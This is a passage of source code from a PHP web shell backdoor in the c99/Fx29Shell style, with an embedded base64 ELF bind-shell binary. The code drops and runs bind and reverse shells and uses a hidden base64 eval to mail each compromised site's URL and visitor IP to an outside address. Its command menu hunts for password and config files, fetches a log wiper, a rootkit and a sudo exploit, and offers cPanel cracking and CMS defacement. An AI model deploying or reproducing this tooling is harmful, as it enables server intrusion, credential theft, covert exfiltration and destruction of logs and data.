nlg+wIobyZBAiFwHQSuAAAAACFwHQJxwQkvJkECP/QycOQkFWJ5VeD7GSD5PC4AAAAAIPAD4PAD8HoBMHgBCnEx0XkAQAAAMdF+EyJBAjHRCQIAAAAAMdEJAQBAAAAxwQkAgAAAOgJ////iUXwg33wAHkYxwQkjIkECOg0/v//xwQkAQAAAOio/v//ZsdF1AIAx0XYAAAAAItFDIPABIsAiQQk6Jv+//8Pt8CJBCTosP7//2aJRdbHRCQQBAAAAI1F5IlEJAzHRCQIAgAAAMdEJAQBAAAAi0XwiQQk6BL+//+NRdTHRCQIEAAAAIlEJASLRfCJBCToKP7//4XAeRjHBCSTiQQI6Kj9///HBCQBAAAA6Bz+///HRCQECAAAAItF8IkEJOi5/f//hcB5GMcEJJiJBAjoef3//8cEJAEAAADo7f3//8dF6BAAAACNReiNVcSJRCQIiVQkBItF8IkEJOht/f//iUX0g330AHkMxwQkjIkECOg4/f//6EP9//+FwA+EpwAAAItF+Ln/////iUW4uAAAAAD8i3248q6JyPfQg+gBx0QkDAAAAACJRCQIi0X4iUQkBItF9IkEJOiQ/f//x0QkBAAAAACLRfSJBCToPf3//8dEJAQBAAAAi0X0iQQk6Cr9///HRCQEAgAAAItF9IkEJOgX/f//x0QkCAAAAADHRCQEn4kECMcEJJ+JBAjoe/z//4tF8IkEJOiA/P//xwQkAAAAAOgE/f//i0X0iQQk6Gn8///pDv///1WJ5VdWMfZT6H/9//+BwyMSAACD7AzoEfz//42DIP///42TIP///4lF8CnQwfgCOcZzFonX/xSyi0Xwg8YBKfiJ+sH4AjnGcuyDxAxbXl9dw1WJ5YPsGIld9Ogt/f//gcPREQAAiXX4iX38jbMg////jbsg////Kf7B/gLrA/8Ut4PuAYP+/3X16DoAAACLXfSLdfiLffyJ7F3DkFWJ5VOD7AShrJkECIP4/3QSu6yZBAj/0ItD/IPrBIP4/3Xzg8QEW13DkJCQVYnlU+i7/P//gcNfEQAAg+wE6LH8//+DxARbXcMAAAADAAAAAQACADo6IHc0Y2sxbmctc2hlbGwgKFByaXZhdGUgQnVpbGQgdjAuMykgYmluZCBzaGVsbCBiYWNrZG9vciA6OiAKCgBzb2NrZXQAYmluZABsaXN0ZW4AL2Jpbi9zaAAAAAAAAP////8AAAAA/////wAAAAAAAAAAAQAAACQAAAAMAAAAiIQECA0AAAAkiQQIBAAAAEiBBAgFAAAAEIMECAYAAADggQQICgAAALAAAAALAAAAEAAAABUAAAAAAAAAAwAAAIyaBAgCAAAAeAAAABQAAAARAAAAFwAAABCEBAgRAAAACIQECBIAAAAIAAAAEwAAAAgAAAD+//9v6IMECP///28BAAAA8P//b8CDBAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwJkECAAAAAAAAAAAtoQECMaEBAjWhAQI5oQECPaEBAgGhQQIFoUECCaFBAg2hQQIRoUECFaFBAhmhQQIdoUECIaFBAiWhQQIAAAAAAAAAAC4mQQIAEdDQzogKEdOVSkgMy40LjYgKFVidW50dSAzLjQuNi0xdWJ1bnR1MikAAEdDQzogKEdOVSkgMy40LjYgKFVidW50dSAzLjQuNi0xdWJ1bnR1MikAAEdDQzogKEdOVSkgNC4wLjMgKFVidW50dSA0LjAuMy0xdWJ1bnR1NSkAAEdDQzogKEdOVSkgNC4wLjMgKFVidW50dSA0LjAuMy0xdWJ1bnR1NSkAAEdDQzogKEdOVSkgMy40LjYgKFVidW50dSAzLjQuNi0xdWJ1bnR1MikAAEdDQzogKEdOVSkgNC4wLjMgKFVidW50dSA0LjAuMy0xdWJ1bnR1NSkAAEdDQzogKEdOVSkgMy40LjYgKFVidW50dSAzLjQuNi0xdWJ1bnR1MikAAAAcAAAAAgAAAAAABAAAAAAAoIUECCIAAAAAAAAAAAAAADQAAAACAAsBAAAEAAAAAADohQQIBAAAACSJBAgSAAAAiIQECAsAAADEhQQIJAAAAAAAAAAAAAAALAAAAAIAmwEAAAQAAAAAAOiFBAgEAAAAO4kECAYAAACdhAQIAgAAAAAAAAAAAAAAIQAAAAIAegAAAJEAAAB5AAAAX0lPX3N0ZGluX3VzZWQAAAAAAHYAAAACAAAAAAAEAQAAAACghQQIwoUECC4uL3N5c2RlcHMvaTM4Ni9lbGYvc3RhcnQuUwAvYnVpbGQvYnVpbGRkL2dsaWJjLTIuMy42L2J1aWxkLXRyZWUvZ2xpYmMtMi4zLjYvY3N1AEdOVSBBUyAyLjE2LjkxAAGAjQAAAAIAFAAAAAQBWwAAAMSFBAjEhQQIYgAAAAEAAAAAEQAAAAKQAAAABAcCVAAAAAEIAp0AAAACBwKLAAAABAcCVgAAAAEGAgcAAAACBQNpbnQABAUCRgAAAAgFAoYAAAAIBwJLAAAABAUCkAAAAAQHAl0AAAABBgSwAAAAARmLAAAAAQUDSIkECAVPAAAAAIwAAAACAFYAAAAEAYIAAAAvYnVpbGQvYnVpbGRkL2dsaWJjLTIuMy42L2J1aWxkLXRyZWUvaTM4Ni1saWJjL2NzdS9jcnRpLlMAL2J1aWxkL2J1aWxkZC9nbGliYy0yLjMuNi9idWlsZC10cmVlL2dsaWJjLTIuMy42L2NzdQBHTlUgQVMgMi4xNi45MQABgIwAAAACAGYAAAAEAS8BAAAvYnVpbGQvYnVpbGRkL2dsaWJjLTIuMy42L2J1aWxkLXRyZWUvaTM4Ni1saWJjL2NzdS9jcnRuLlMAL2J1aWxkL2J1aWxkZC9nbGliYy0yLjMuNi9idWlsZC10cmVlL2dsaWJjLTIuMy42L2NzdQBHTlUgQVMgMi4xNi45MQABgAERABAGEQESAQMIGwglCBMFAAAAAREBEAYSAREBJQ4TCwMOGw4AAAIkAAMOCws+CwAAAyQAAwgLCz4LAAAENAADDjoLOwtJEz8MAgoAAAUmAEkTAAAAAREAEAYDCBsIJQgTBQAAAAERABAGAwgbCCUIEwUAAABXAAAAAgAyAAAAAQH7Dg0AAQEBAQAAAAEAAAEuLi9zeXNkZXBzL2kzODYvZWxmAABzdGFydC5TAAEAAAAABQKghQQIA8AAATMhND0lIgMYIFlaISJcWwIBAAEBIwAAAAIAHQAAAAEB+w4NAAEBAQEAAAABAAABAGluaXQuYwAAAAAAqQAAAAIAUAAAAAEB+w4NAAEBAQEAAAABAAABL2J1aWxkL2J1aWxkZC9nbGliYy0yLjMuNi9idWlsZC10cmVlL2kzODYtbGliYy9jc3UAAGNydGkuUwABAAAAAAUC6IUECAPAAAE9AgEAAQEABQIkiQQIAy4BIS8hWWcCAwABAQAFAoiEBAgDHwEhLz0CBQABAQAFAsSFBAgDCgEhLyFZZz1nLy8wPSEhAgEAAQGIAAAAAgBQAAAAAQH7Dg0AAQEBAQAAAAEAAAEvYnVpbGQvYnVpbGRkL2dsaWJjLTIuMy42L2J1aWxkLXRyZWUvaTM4Ni1saWJjL2NzdQAAY3J0bi5TAAEAAAAABQLohQQIAyEBPQIBAAEBAAUCO4kECAMSAT0hIQIBAAEBAAUCnYQECAMJASECAQABAWluaXQuYwBzaG9ydCBpbnQAL2J1aWxkL2J1aWxkZC9nbGliYy0yLjMuNi9idWlsZC10cmVlL2dsaWJjLTIuMy42L2NzdQBsb25nIGxvbmcgaW50AHVuc2lnbmVkIGNoYXIAR05VIEMgMy40LjYgKFVidW50dSAzLjQuNi0xdWJ1bnR1MikAbG9uZyBsb25nIHVuc2lnbmVkIGludABzaG9ydCB1bnNpZ25lZCBpbnQAX0lPX3N0ZGluX3VzZWQAAC5zeW10YWIALnN0cnRhYgAuc2hzdHJ0YWIALmludGVycAAubm90ZS5BQkktdGFnAC5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbC5keW4ALnJlbC5wbHQALmluaXQALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWUALmN0b3JzAC5kdG9ycwAuamNyAC5keW5hbWljAC5nb3QALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAuZGVidWdfYXJhbmdlcwAuZGVidWdfcHVibmFtZXMALmRlYnVnX2luZm8ALmRlYnVnX2FiYnJldgAuZGVidWdfbGluZQAuZGVidWdfc3RyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAEAAAACAAAAFIEECBQBAAATAAAAAAAAAAAAAAABAAAAAAAAACMAAAAHAAAAAgAAACiBBAgoAQAAIAAAAAAAAAAAAAAABAAAAAAAAAAxAAAABQAAAAIAAABIgQQISAEAAJgAAAAEAAAAAAAAAAQAAAAEAAAANwAAAAsAAAACAAAA4IEECOABAAAwAQAABQAAAAEAAAAEAAAAEAAAAD8AAAADAAAAAgAAABCDBAgQAwAAsAAAAAAAAAAAAAAAAQAAAAAAAABHAAAA////bwIAAADAgwQIwAMAACYAAAAEAAAAAAAAAAIAAAACAAAAVAAAAP7//28CAAAA6IMECOgDAAAgAAAABQAAAAEAAAAEAAAAAAAAAGMAAAAJAAAAAgAAAAiEBAgIBAAACAAAAAQAAAAAAAAABAAAAAgAAABsAAAACQAAAAIAAAAQhAQIEAQAAHgAAAAEAAAACwAAAAQAAAAIAAAAdQAAAAEAAAAGAAAAiIQECIgEAAAXAAAAAAAAAAAAAAABAAAAAAAAAHAAAAABAAAABgAAAKCEBAigBAAAAAEAAAAAAAAAAAAABAAAAAQAAAB7AAAAAQAAAAYAAACghQQIoAUAAIQDAAAAAAAAAAAAAAQAAAAAAAAAgQAAAAEAAAAGAAAAJIkECCQJAAAdAAAAAAAAAAAAAAABAAAAAAAAAIcAAAABAAAAAgAAAESJBAhECQAAYwAAAAAAAAAAAAAABAAAAAAAAACPAAAAAQAAAAIAAACoiQQIqAkAAAQAAAAAAAAAAAAAAAQAAAAAAAAAmQAAAAEAAAADAAAArJkECKwJAAAIAAAAAAAAAAAAAAAEAAAAAAAAAKAAAAABAAAAAwAAALSZBAi0CQAACAAAAAAAAAAAAAAABAAAAAAAAACnAAAAAQAAAAMAAAC8mQQIvAkAAAQAAAAAAAAAAAAAAAQAAAAAAAAArAAAAAYAAAADAAAAwJkECMAJAADIAAAABQAAAAAAAAAEAAAACAAAALUAAAABAAAAAwAAAIiaBAiICgAABAAAAAAAAAAAAAAABAAAAAQAAAC6AAAAAQAAAAMAAACMmgQIjAoAAEgAAAAAAAAAAAAAAAQAAAAEAAAAwwAAAAEAAAADAAAA1JoECNQKAAAMAAAAAAAAAAAAAAAEAAAAAAAAAMkAAAAIAAAAAwAAAOCaBAjgCgAABAAAAAAAAAAAAAAABAAAAAAAAADOAAAAAQAAAAAAAAAAAAAA4AoAACYBAAAAAAAAAAAAAAEAAAAAAAAA1wAAAAEAAAAAAAAAAAAAAAgMAACIAAAAAAAAAAAAAAAIAAAAAAAAAOYAAAABAAAAAAAAAAAAAACQDAAAJQAAAAAAAAAAAAAAAQAAAAAAAAD2AAAAAQAAAAAAAAAAAAAAtQwAACsCAAAAAAAAAAAAAAEAAAAAAAAAAgEAAAEAAAAAAAAAAAAAAOAOAAB2AAAAAAAAAAAAAAABAAAAAAAAABABAAABAAAAAAAAAAAAAABWDwAAuwEAAAAAAAAAAAAAAQAAAAAAAAAcAQAAAQAAADAAAAAAAAAAEREAAL8AAAAAAAAAAAAAAAEAAAABAAAAEQAAAAMAAAAAAAAAAAAAANARAAAnAQAAAAAAAAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAABIGAAA8AUAACEAAAA/AAAABAAAABAAAAAJAAAAAwAAAAAAAAAAAAAAOB4AALIDAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUgQQIAAAAAAMAAQAAAAAAKIEECAAAAAADAAIAAAAAAEiBBAgAAAAAAwADAAAAAADggQQIAAAAAAMABAAAAAAAEIMECAAAAAADAAUAAAAAAMCDBAgAAAAAAwAGAAAAAADogwQIAAAAAAMABwAAAAAACIQECAAAAAADAAgAAAAAABCEBAgAAAAAAwAJAAAAAACIhAQIAAAAAAMACgAAAAAAoIQECAAAAAADAAsAAAAAAKCFBAgAAAAAAwAMAAAAAAAkiQQIAAAAAAMADQAAAAAARIkECAAAAAADAA4AAAAAAKiJBAgAAAAAAwAPAAAAAACsmQQIAAAAAAMAEAAAAAAAtJkECAAAAAADABEAAAAAALyZBAgAAAAAAwASAAAAAADAmQQIAAAAAAMAEwAAAAAAiJoECAAAAAADABQAAAAAAIyaBAgAAAAAAwAVAAAAAADUmgQIAAAAAAMAFgAAAAAA4JoECAAAAAADABcAAAAAAAAAAAAAAAAAAwAYAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAADABoAAAAAAAAAAAAAAAAAAwAbAAAAAAAAAAAAAAAAAAMAHAAAAAAAAAAAAAAAAAADAB0AAAAAAAAAAAAAAAAAAwAeAAAAAAAAAAAAAAAAAAMAHwAAAAAAAAAAAAAAAAADACAAAAAAAAAAAAAAAAAAAwAhAAEAAAAAAAAAAAAAAAQA8f8MAAAAAAAAAAAAAAAEAPH/KAAAAAAAAAAAAAAABADx/y8AAAAAAAAAAAAAAAQA8f86AAAAAAAAAAAAAAAEAPH/dAAAAMSFBAgAAAAAAgAMAIQAAAAAAAAAAAAAAAQA8f+PAAAArJkECAAAAAABABAAnQAAALSZBAgAAAAAAQARAKsAAAC8mQQIAAAAAAEAEgC4AAAA4JoECAEAAAABABcAxwAAANyaBAgAAAAAAQAWAM4AAADshQQIAAAAAAIADADkAAAAG4YECAAAAAACAAwAhAAAAAAAAAAAAAAABADx//AAAACwmQQIAAAAAAEAEAD9AAAAuJkECAAAAAABABEACgEAAKiJBAgAAAAAAQAPABgBAAC8mQQIAAAAAAEAEgAkAQAA+IgECAAAAAACAAwALwAAAAAAAAAAAAAABADx/zoBAAAAAAAAAAAAAAQA8f90AQAAAAAAAAAAAAAEAPH/eAEAAMCZBAgAAAAAAQITAIEBAACsmQQIAAAAAAAC8f+SAQAArJkECAAAAAAAAvH/pQEAAKyZBAgAAAAAAALx/7YBAACMmgQIAAAAAAECFQDMAQAArJkECAAAAAAAAvH/3wEAAAAAAAB1AQAAEgAAAPABAAAAAAAAcQAAABIAAAABAgAARIkECAQAAAARAA4ACAIAAAAAAADMAAAAEgAAABoCAAAAAAAAWgAAABIAAAAqAgAA2JoECAAAAAARAhYANwIAAK2IBAhKAAAAEgAMAEcCAAAAAAAAeAAAABIAAABZAgAAiIQECAAAAAASAAoAXwIAAAAAAAA5AAAAEgAAAHECAAAAAAAAOQAAABIAAACHAgAAoIUECAAAAAASAAwAjgIAAFyIBAhRAAAAEgAMAJ4CAADgmgQIAAAAABAA8f+qAgAAQIYECBwCAAASAAwArwIAAAAAAADmAAAAEgAAAMwCAAAAAAAAOgAAABIAAADcAgAA1JoECAAAAAAgABYA5wIAAAAAAAA5AAAAEgAAAPcCAAAkiQQIAAAAABIADQD9AgAAAAAAALkAAAASAAAADQMAAAAAAAArAAAAEgAAAB0DAADgmgQIAAAAABAA8f8kAwAA6IUECAAAAAASAgwAOwMAAOSaBAgAAAAAEADx/0ADAAAAAAAAeAAAABIAAABQAwAAAAAAAA4AAAASAAAAYQMAAEiJBAgEAAAAEQAOAHADAADUmgQIAAAAABAAFgB9AwAAAAAAADkAAAASAAAAjwMAAAAAAAAAAAAAIAAAAKMDAAAAAAAAAAAAACAAAAAAYWJpLW5vdGUuUwAuLi9zeXNkZXBzL2kzODYvZWxmL3N0YXJ0LlMAaW5pdC5jAGluaXRmaW5pLmMAL2J1aWxkL2J1aWxkZC9nbGliYy0yLjMuNi9idWlsZC10cmVlL2kzODYtbGliYy9jc3UvY3J0aS5TAGNhbGxfZ21vbl9zdGFydABjcnRzdHVmZi5jAF9fQ1RPUl9MSVNUX18AX19EVE9SX0xJU1RfXwBfX0pDUl9MSVNUX18AY29tcGxldGVkLjQ0NjMAcC40NDYyAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABmcmFtZV9kdW1teQBfX0NUT1JfRU5EX18AX19EVE9SX0VORF9fAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kb19nbG9iYWxfY3RvcnNfYXV4AC9idWlsZC9idWlsZGQvZ2xpYmMtMi4zLjYvYnVpbGQtdHJlZS9pMzg2LWxpYmMvY3N1L2NydG4uUwAxLmMAX0RZTkFNSUMAX19maW5pX2FycmF5X2VuZABfX2ZpbmlfYXJyYXlfc3RhcnQAX19pbml0X2FycmF5X2VuZABfR0xPQkFMX09GRlNFVF9UQUJMRV8AX19pbml0X2FycmF5X3N0YXJ0AGV4ZWNsQEBHTElCQ18yLjAAY2xvc2VAQEdMSUJDXzIuMABfZnBfaHcAcGVycm9yQEBHTElCQ18yLjAAZm9ya0BAR0xJQkNfMi4wAF9fZHNvX2hhbmRsZQBfX2xpYmNfY3N1X2ZpbmkAYWNjZXB0QEBHTElCQ18yLjAAX2luaXQAbGlzdGVuQEBHTElCQ18yLjAAc2V0c29ja29wdEBAR0xJQkNfMi4wAF9zdGFydABfX2xpYmNfY3N1X2luaXQAX19ic3Nfc3RhcnQAbWFpbgBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4wAGR1cDJAQEdMSUJDXzIuMABkYXRhX3N0YXJ0AGJpbmRAQEdMSUJDXzIuMABfZmluaQBleGl0QEBHTElCQ18yLjAAYXRvaUBAR0xJQkNfMi4wAF9lZGF0YQBfX2k2ODYuZ2V0X3BjX3RodW5rLmJ4AF9lbmQAc2VuZEBAR0xJQkNfMi4wAGh0b25zQEBHTElCQ18yLjAAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19nbW9uX3N0YXJ0X18A";

function cf($fname,$text) {
  $w_file=@fopen($fname,"w") or err();
  if($w_file) {
    @fputs($w_file,@base64_decode($text));
    @fclose($w_file);
  }
}

function cfb($fname,$text) {
  $w_file=@fopen($fname,"w") or bberr();
  if($w_file) {
    @fputs($w_file,@base64_decode($text));
    @fclose($w_file);
  }
}
function err() { $_POST['backcconnmsge']="<br><br><div class=fxerrmsg>Error:</div> Can't connect!"; }
function bberr() { $_POST['backcconnmsge']="<br><br><div class=fxerrmsg>Error:</div> Can't backdoor host!"; }

if (!empty($_POST['backconnectport']) && ($_POST['use']=="shbd")) {
  $ip = gethostbyname($_SERVER["HTTP_HOST"]);
  $por = $_POST['backconnectport'];
  if (is_writable(".")) {
    cfb("shbd",$backdoor);
    ex("chmod 777 shbd");
    $cmd = "./shbd $por";
    exec("$cmd > /dev/null &");
    $scan = myshellexec("ps aux");
  } else {
    cfb("/tmp/shbd",$backdoor);
    ex("chmod 777 /tmp/shbd");
    $cmd = "./tmp/shbd $por";
    exec("$cmd > /dev/null &");
    $scan = myshellexec("ps aux");
  }
  if (eregi("./shbd $por",$scan)) {
    $data = ("\n<br>Backdoor setup successfully.");
  } else {
    $data = ("\n<br>Process not found, backdoor setup failed!");
  }
  $_POST['backcconnmsg']="To connect, use netcat! Usage: <b>'nc $ip $por'</b>.$data";
}

if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']=="Perl")) {
  if (is_writable(".")) {
    cf("back",$back_connect_pl);
    $p2 = which("perl");
    $blah = ex($p2." back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
    if (file_exists("back")) { unlink("back"); }
  } else {
    cf("/tmp/back",$back_connect_pl);
    $p2 = which("perl");
    $blah = ex($p2." /tmp/back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
    if (file_exists("/tmp/back")) { unlink("/tmp/back"); }
  }
  $_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
}

if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']=="C")) {
  if (is_writable(".")) {
    cf("backc",$back_connect_c);
    ex("chmod 777 backc");
    $blah = ex("./backc ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
    if (file_exists("backc")) { unlink("backc"); }
  } else {
    ex("chmod 777 /tmp/backc");
    cf("/tmp/backc",$back_connect_c);
    $blah = ex("/tmp/backc ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
    if (file_exists("/tmp/backc")) { unlink("/tmp/backc"); }
  }
  $_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
}
//End of Backdoor

//Starting calls
@ini_set("max_execution_time",0);
if (!function_exists("getmicrotime")) {
  function getmicrotime() {
    list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);
  }
}
error_reporting(5);
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
define("starttime",getmicrotime());
$shell_data = "JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07IGlmKCAkdmlzaXRjb3VudCA9PSAiIikgeyR2aXNpdGNvdW50ID0gMDsgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsgJHdlYiA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsgJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOyAkdGFyZ2V0ID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7ICRib2R5ID0gIkJvc3MsIHRoZXJlIHdhcyBhbiBpbmplY3RlZCB0YXJnZXQgb24gJHRhcmdldCBieSAkdmlzaXRvciI7IEBtYWlsKCJmZWVsY29tekBnbWFpbC5jb20iLCJGeDI5U2hlbGwgaHR0cDovLyR0YXJnZXQgYnkgJHZpc2l0b3IiLCAiJGJvZHkiKTsgfSBlbHNlIHsgJHZpc2l0Y291bnQ7IH0gc2V0Y29va2llKCJ2aXNpdHMiLCR2aXNpdGNvdW50KTs="; eval(base64_decode($shell_data));
if (get_magic_quotes_gpc()) {
  if (!function_exists("strips")) {
    function strips(&$arr,$k="") {
      if (is_array($arr)) {
        foreach($arr as $k=>$v) {
          if (strtoupper($k) != "GLOBALS") { strips($arr["$k"]); }
        }
      } else {$arr = stripslashes($arr);}
    }
  }
  strips($GLOBALS);
}
//CONFIGURATIONS
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
$surl_autofill_include = TRUE; //If TRUE then search variables with descriptors (URLs) and save it in SURL.
foreach($_REQUEST as $k=>$v) { if (!isset($$k)) {$$k = $v;} }
if ($surl_autofill_include) {
  $include = "&";
  foreach (explode("&",getenv("QUERY_STRING")) as $v) {
    $v = explode("=",$v);
    $name = urldecode($v[0]);
    $value = urldecode($v[1]);
    foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {
      if (strpos($value,$needle) === 0) {
        $includestr .= urlencode($name)."=".urlencode($value)."&";
      }
    }
  }
}
if (empty($surl)) {
  $surl = "?".$includestr; //Self url
}
$surl = htmlspecialchars($surl);

// Registered file-types.
$ftypes  = array(
    "html"=>array("html","htm","shtml"),
    "txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
    "exe"=>array("sh","install","bat","cmd"),
    "ini"=>array("ini","inf","conf"),
    "code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
    "img"=>array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
    "sdb"=>array("sdb"),
    "phpsess"=>array("sess"),
    "download"=>array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);
//Registered executable file-types.
$exeftypes  = array(
    getenv("PHPRC")." -q %f%" => array("php","php3","php4"),
    "perl %f%" => array("pl","cgi")
);
//Highlighted files.
$regxp_highlight  = array(
    array(basename($_SERVER["PHP_SELF"]),1,"<font color=#FFFF00>","</font>"),
    array("\.tgz$",1,"<font color=#C082FF>","</font>"),
    array("\.gz$",1,"<font color=#C082FF>","</font>"),
    array("\.tar$",1,"<font color=#C082FF>","</font>"),
    array("\.bz2$",1,"<font color=#C082FF>","</font>"),
    array("\.zip$",1,"<font color=#C082FF>","</font>"),
    array("\.rar$",1,"<font color=#C082FF>","</font>"),
    array("\.php$",1,"<font color=#00FF00>","</font>"),
    array("\.php3$",1,"<font color=#00FF00>","</font>"),
    array("\.php4$",1,"<font color=#00FF00>","</font>"),
    array("\.jpg$",1,"<font color=#00FFFF>","</font>"),
    array("\.jpeg$",1,"<font color=#00FFFF>","</font>"),
    array("\.JPG$",1,"<font color=#00FFFF>","</font>"),
    array("\.JPEG$",1,"<font color=#00FFFF>","</font>"),
    array("\.ico$",1,"<font color=#00FFFF>","</font>"),
    array("\.gif$",1,"<font color=#00FFFF>","</font>"),
    array("\.png$",1,"<font color=#00FFFF>","</font>"),
    array("\.htm$",1,"<font color=#00CCFF>","</font>"),
    array("\.html$",1,"<font color=#00CCFF>","</font>"),
    array("\.txt$",1,"<font color=#C0C0C0>","</font>")
);
//Command Aliases
if (!$win) {
  $cmdaliases = array(
    array("", "ls -al"),
    array("Find all suid files", "find / -type f -perm -04000 -ls"),
    array("Find suid files in current dir", "find . -type f -perm -04000 -ls"),
    array("Find all sgid files", "find / -type f -perm -02000 -ls"),
    array("Find sgid files in current dir", "find . -type f -perm -02000 -ls"),
    array("Find config.inc.php files", "find / -type f -name config.inc.php"),
    array("Find config* files", "find / -type f -name \"config*\""),
    array("Find config* files in current dir", "find . -type f -name \"config*\""),
    array("Find all writable folders and files", "find / -perm -2 -ls"),
    array("Find all writable folders and files in current dir", "find . -perm -2 -ls"),
    array("Find all writable folders", "find / -type d -perm -2 -ls"),
    array("Find all writable folders in current dir", "find . -type d -perm -2 -ls"),
    array("Find all service.pwd files", "find / -type f -name service.pwd"),
    array("Find service.pwd files in current dir", "find . -type f -name service.pwd"),
    array("Find all .htpasswd files", "find / -type f -name .htpasswd"),
    array("Find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
    array("Find all .bash_history files", "find / -type f -name .bash_history"),
    array("Find .bash_history files in current dir", "find . -type f -name .bash_history"),
    array("Find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
    array("Find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
    array("List file attributes on a Linux second extended file system", "lsattr -va"),
    array("Show opened ports", "netstat -an | grep -i listen")
  );
  $cmdaliases2 = array(
    array("wget & extract psyBNC","wget ".$sh_mainurl."fx.tar.gz;tar -zxf fx.tar.gz"),
    array("wget & extract EggDrop","wget ".$sh_mainurl."fxb.tar.gz;tar -zxf fxb.tar.gz"),
    array("-----",""),
    array("Logged in users","w"),
    array("Last to connect","lastlog"),
    array("Find Suid bins","find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null"),
    array("User Without Password","cut -d: -f1,2,3 /etc/passwd | grep ::"),
    array("Can write in /etc/?","find /etc/ -type f -perm -o+w 2> /dev/null"),
    array("Downloaders?","which wget curl w3m lynx fetch lwp-download"),
    array("CPU Info","cat /proc/version /proc/cpuinfo"),
    array("Is gcc installed ?","locate gcc"),
    array("Format box (DANGEROUS)","rm -Rf"),
    array("-----",""),
    array("wget WIPELOGS PT1","wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c"),
    array("gcc WIPELOGS PT2","gcc zap2.c -o zap2"),
    array("Run WIPELOGS PT3","./zap2"),
    array("-----",""),
    array("wget RatHole 1.2 (Linux & BSD)","wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz"),
    array("wget & run BindDoor","wget ".$sh_mainurl."toolz/bind.tar.gz;tar -zxvf bind.tar.gz;./4877"),
    array("wget Sudo Exploit","wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c"),
  );
}
else {
  $cmdaliases = array(
    array("", "dir"),
    array("Find index.php in current dir", "dir /s /w /b index.php"),
    array("Find *config*.php in current dir", "dir /s /w /b *config*.php"),
    array("Find c99shell in current dir", "find /c \"c99\" *"),
    array("Find r57shell in current dir", "find /c \"r57\" *"),
    array("Show active connections", "netstat -an"),
    array("Show running services", "net start"),
    array("User accounts", "net user"),
    array("Show computers", "net view"),
    );
}

//Quick launch
$quicklaunch1 = array(
    array("<img src=\"".$surl."act=img&img=home\" alt=\"Home\" border=\"0\">",$surl),
    array("<img src=\"".$surl."act=img&img=back\" alt=\"Back\" border=\"0\">","#\" onclick=\"history.back(1)"),
    array("<img src=\"".$surl."act=img&img=forward\" alt=\"Forward\" border=\"0\">","#\" onclick=\"history.go(1)"),
    array("<img src=\"".$surl."act=img&img=up\" alt=\"Up\" border=\"0\">",$surl."act=ls&d=%upd&sort=%sort"),
    array("<img src=\"".$surl."act=img&img=search\" alt=\"Search\" border=\"0\">",$surl."act=search&d=%d"),
);
$quicklaunch2 = array(
    array("About",$surl."act=about"),
    array("ChMod",$surl."act=chmod"),
    array("Cpanel Cracker",$surl."act=cpn"),
    array("Get Config",$surl."act=configler"),
    array("WHMCS Server",$surl."act=whm"),
    array("Change WordPress Info",$surl."act=wpchange"),
    array("Change Joomla Info",$surl."act=changejoo"),
    array("Change Vb Index",$surl."act=vbchange"),
    array("Zone-H",$surl."act=zone"),
    array("Get DomainsList",$surl."act=GetDomains")
);


if (!$win) {
$quicklaunch2[] = array("Back-Connect",$surl."act=backc");
}

//Highlight-code colors
$highlight_background = "#C0C0C0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";

@$f = $_REQUEST["f"];
@extract($_REQUEST["c99shcook"]);
//END OF CONFIGURATIONS

//STOP EDITING!

//Authentication
@set_time_limit(0);
$tmp = array();
